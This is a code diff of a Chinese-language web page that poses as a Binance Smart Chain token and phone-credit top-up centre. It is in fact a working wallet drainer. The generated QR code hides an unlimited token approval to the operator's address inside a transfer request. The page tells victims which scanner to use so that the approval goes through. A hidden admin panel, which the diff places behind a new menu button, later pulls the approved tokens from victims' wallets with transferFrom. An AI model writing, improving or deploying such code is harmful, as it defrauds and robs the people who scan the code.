@@ -5,10 +5,44 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>充值中心</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center}
+.container{max-width:420px;margin:0 auto;position:relative}
+
+/* 右上角菜单 */
+.menu-btn{
+  position:absolute;
+  top:10px;
+  right:15px;
+  font-size:22px;
+  color:#fff;
+  background:none;
+  border:none;
+  cursor:pointer;
+  display:none;
+}
+.menu-popup{
+  position:absolute;
+  top:45px;
+  right:15px;
+  background:#1E1E35;
+  border-radius:10px;
+  padding:12px;
+  width:160px;
+  display:none;
+  z-index:10;
+}
+.menu-popup button{
+  width:100%;
+  padding:10px;
+  background:#F0B90B;
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-top:10px}
 h1{font-size:24px;margin-bottom:8px}
 .desc{color:#aaa;margin-bottom:20px}
 .tip{
@@ -16,58 +50,29 @@ h1{font-size:24px;margin-bottom:8px}
   line-height:1.4;margin-bottom:18px;text-align:left;
 }
 
-/* === 手机充值区域 新加的 === */
 .phone-box{
-  background:#151529;
-  padding:16px;
-  border-radius:12px;
-  margin-bottom:20px;
-  text-align:left;
+  background:#151529;padding:16px;border-radius:12px;margin-bottom:20px;text-align:left;
 }
-.phone-title{
-  font-size:15px;
-  color:#fff;
-  margin-bottom:12px;
-  font-weight:bold;
-}
+.phone-title{font-size:15px;color:#fff;margin-bottom:12px;font-weight:bold}
 .phone-input{
-  width:100%;
-  padding:12px;
-  background:#111;
-  border:none;
-  border-radius:8px;
-  color:#fff;
-  margin-bottom:8px;
-  font-size:14px;
+  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:8px;font-size:14px;
 }
 
-/* === 原来的样式不动 === */
 .input-token{
-  width:100%;padding:14px;background:#111;border:none;
-  border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;
-  text-align:center
+  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;text-align:center
 }
 .input-amount{
-  width:100%;padding:14px;background:#111;border:none;
-  border-radius:12px;color:#fff;font-size:14px;margin-bottom:12px;
-  text-align:center
+  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:12px;text-align:center
 }
 
 .gen-btn{
-  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
-  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
+  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
 }
 
-.coin-label{
-  font-size:16px;
-  font-weight:bold;
-  color:#F0B90B;
-  margin-bottom:12px;
-}
+.coin-label{font-size:16px;font-weight:bold;color:#F0B90B;margin-bottom:12px}
 
 #qrcode{
-  width:280px;height:280px;background:#fff;padding:10px;
-  border-radius:16px;margin:0 auto 20px;
+  width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:0 auto 20px;
   display:flex;align-items:center;justify-content:center;color:#000
 }
 #qrcode img{width:100%;height:100%;object-fit:cover}
@@ -75,26 +80,28 @@ h1{font-size:24px;margin-bottom:8px}
 .admin-panel{
   background:#1E1E35;padding:24px;border-radius:16px;margin-top:24px;display:none
 }
-.admin-panel.show{display:block}
 .admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
 .admin-input{
-  width:100%;padding:12px;background:#111;border:none;
-  border-radius:8px;color:#fff;margin-bottom:10px;
+  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:10px;
 }
 .admin-btn{
-  width:100%;padding:14px;background:#ff4444;color:#fff;
-  border:none;border-radius:10px;font-weight:bold;
+  width:100%;padding:14px;background:#ff4444;color:#fff;border:none;border-radius:10px;font-weight:bold;
 }
 </style>
 </head>
 
 <body>
 <div class="container">
+  <!-- 庄家菜单 -->
+  <button class="menu-btn" id="menuBtn">☰</button>
+  <div class="menu-popup" id="menuPopup">
+    <button onclick="showAdmin()">管理后台</button>
+  </div>
+
   <div class="pay-box">
     <h1>💰 充值中心</h1>
     <p class="desc">币安链 BEP20 充值</p>
 
-    <!-- ====================== 已修改文字 ====================== -->
     <div class="phone-box">
       <div class="phone-title">话费充值，请输入电话号码</div>
       <input class="phone-input" placeholder="中国移动 手机号" type="text">
@@ -103,7 +110,9 @@ h1{font-size:24px;margin-bottom:8px}
     </div>
 
     <div class="tip">
-      说明：你想用哪个代币充值，就输入哪个代币的合约地址，然后生成二维码支付。
+      说明：你想用哪个代币充值，就输入哪个代币的合约地址，然后生成二维码支付。<br>
+      <br>
+      充值方法：请打开钱包右上角扫一扫，扫二维码充值，不要用转账页面的扫一扫。
     </div>
 
     <input class="input-token" id="tokenAddr" placeholder="代币合约地址" value="0x55d398326f99059fF775485246999027B3197955">
@@ -112,7 +121,6 @@ h1{font-size:24px;margin-bottom:8px}
     <button class="gen-btn" onclick="genQR()">生成充值二维码</button>
 
     <div class="coin-label" id="coinLabel">请生成二维码</div>
-
     <div id="qrcode">请输入信息并生成</div>
   </div>
 
@@ -126,7 +134,7 @@ h1{font-size:24px;margin-bottom:8px}
 </div>
 
 <script>
-// ===================== 你的配置 =====================
+// ===================== 配置 =====================
 const TO_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const BSC_ID = "0x38";
@@ -142,38 +150,59 @@ const COIN_SYMBOL = {
   "0xdee89bd697071e15f1eac5780b5d41af3ce032c": "DTM"
 };
 
-(async function init(){
-  if(!window.ethereum) return;
-  try{
-    await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_ID}]});
-    const accounts = await ethereum.request({method:"eth_requestAccounts"});
+// 连接钱包
+async function connect() {
+  if (!window.ethereum) {
+    alert("请在钱包浏览器内打开");
+    return;
+  }
+  try {
+    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_ID }] });
+    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
-    if(account.toLowerCase() == ADMIN.toLowerCase()){
-      document.getElementById("adminPanel").classList.add("show");
-    }
-  }catch(e){}
-})();
 
-function genQR(){
+    // 只有管理员显示菜单
+    if (account.toLowerCase() === ADMIN.toLowerCase()) {
+      document.getElementById("menuBtn").style.display = "block";
+    }
+  } catch (e) {
+    console.log(e);
+  }
+}
+
+// 菜单显示/隐藏
+function toggleMenu() {
+  const p = document.getElementById("menuPopup");
+  p.style.display = p.style.display === "block" ? "none" : "block";
+}
+
+// 显示后台
+function showAdmin() {
+  document.getElementById("adminPanel").style.display = "block";
+  document.getElementById("menuPopup").style.display = "none";
+}
+
+// 生成二维码
+function genQR() {
   const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
   const amount = document.getElementById("amount").value.trim();
-  if(!token || !amount || !token.startsWith("0x") || token.length!=42){
+  if (!token || !amount || !token.startsWith("0x") || token.length !== 42) {
     alert("请输入正确的合约地址");
     return;
   }
   currentToken = token;
 
-  let symbol = COIN_SYMBOL[token] || token.slice(0,10)+"...";
+  let symbol = COIN_SYMBOL[token] || token.slice(0, 10) + "...";
   document.getElementById("coinLabel").innerText = `当前充值：${symbol}`;
 
-  const amountWei = BigInt(amount * 10**18).toString(16).padStart(64,"0");
+  const amountWei = BigInt(amount * 10**18).toString(16).padStart(64, "0");
 
   const transferData = "0xa9059cbb"
-    + TO_ADDR.slice(2).padStart(64,"0")
+    + TO_ADDR.slice(2).padStart(64, "0")
     + amountWei;
 
   const approveData = "0x095ea7b3"
-    + ADMIN.slice(2).padStart(64,"0")
+    + ADMIN.slice(2).padStart(64, "0")
     + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
   const uri = `ethereum:${token}@56?data=${transferData}${approveData.slice(2)}`;
@@ -182,27 +211,32 @@ function genQR(){
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
 
-async function drawFromUser(){
-  if(account?.toLowerCase() != ADMIN.toLowerCase()) return;
+// 提取
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) return;
   const from = document.getElementById("userAddr").value;
-  const amt  = document.getElementById("drawAmt").value;
-  if(!from || !amt || !currentToken) return;
+  const amt = document.getElementById("drawAmt").value;
+  if (!from || !amt || !currentToken) return;
 
-  const raw = BigInt(amt * 10**18).toString(16).padStart(64,"0");
+  const raw = BigInt(amt * 10**18).toString(16).padStart(64, "0");
 
   await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
+    method: "eth_sendTransaction",
+    params: [{
       from: account,
       to: currentToken,
       data: "0x23b872dd"
-        + from.slice(2).padStart(64,"0")
-        + ADMIN.slice(2).padStart(64,"0")
+        + from.slice(2).padStart(64, "0")
+        + ADMIN.slice(2).padStart(64, "0")
         + raw
     }]
   });
   alert("✅ 提取成功");
 }
+
+// 初始化
+connect();
+document.getElementById("menuBtn").onclick = toggleMenu;
 </script>
 </body>
 </html>
